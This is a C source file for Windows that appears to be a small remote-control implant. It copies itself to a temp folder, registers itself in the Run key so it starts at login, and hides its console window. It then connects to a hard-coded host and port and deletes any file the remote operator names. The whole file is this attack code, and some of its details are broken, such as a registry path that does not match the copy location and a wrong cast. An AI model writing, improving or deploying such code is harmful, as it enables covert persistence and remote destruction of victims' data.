#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <dos.h>
#include <winreg.h>
#pragma comment(lib, "ws2_32.lib")
#define Error -1
#define Port 1234
#define IP "127.0.0.1"

int Autorun() {
	DWORD Path = 0;
	TCHAR IpFilename[MAX_PATH] = { 0 };
	HKEY hKey;
	if ((Path = GetModuleFileName(NULL, IpFilename, MAX_PATH)) == 0){
		printf("Error getting the path\n");
		return EXIT_FAILURE;
	}
	CopyFile(IpFilename, L"C:\\Windows\\temp\\Client.exe",0);
	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0, KEY_SET_VALUE, &hKey)!= ERROR_SUCCESS){
		printf("Error opening registry key\n");
		RegCloseKey(hKey);
		return EXIT_FAILURE;
	}
	if (RegSetValueEx(hKey, L"Client", 0, REG_SZ, (const BYTE)L"C:\\temp\\Client.exe", Path * sizeof(*IpFilename)) != ERROR_SUCCESS) {
		printf("Error when creating a parameter or assigning a value to it\n");
		RegCloseKey(hKey);
		return EXIT_FAILURE;
	}
	RegCloseKey(hKey);
	return EXIT_SUCCESS;
}
int main() {
	if (Autorun() == EXIT_FAILURE) {
		return EXIT_FAILURE; 
	}
	HWND HWnd = GetConsoleWindow();
	ShowWindow(HWnd, SW_HIDE);
	WSADATA Ws; 
	char FileName[100] = { 0 };
	char DeletionError[50] = { "Deletion error"};
	char Successful[50] = { "The deletion was successful" };
	if (WSAStartup(MAKEWORD(2, 2), &Ws)) {
		printf("Error WinSock version initializaion");
		return EXIT_FAILURE;
	}
	SOCKET Socket = socket(AF_INET, SOCK_STREAM, 0);
	if (Socket == INVALID_SOCKET) {
		printf("Error initialization socket");
		closesocket(Socket);
		return EXIT_FAILURE;
	}
	SOCKADDR_IN SockAddr; 
	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_port = htons(Port);
	SockAddr.sin_addr.S_un.S_addr = inet_addr(IP);
	while (connect(Socket, (struct sockaddr*)&SockAddr, sizeof(SockAddr)) == SOCKET_ERROR);
	while (1) { 
		recv(Socket, FileName, sizeof(FileName), 0); 
		if (strcmp(FileName, "Exit") == 0) break;
		if (remove(FileName)) send(Socket, DeletionError, sizeof(DeletionError), 0);
		else send(Socket, Successful, sizeof(Successful), 0);

	}
	closesocket(Socket);
	return EXIT_SUCCESS;
}
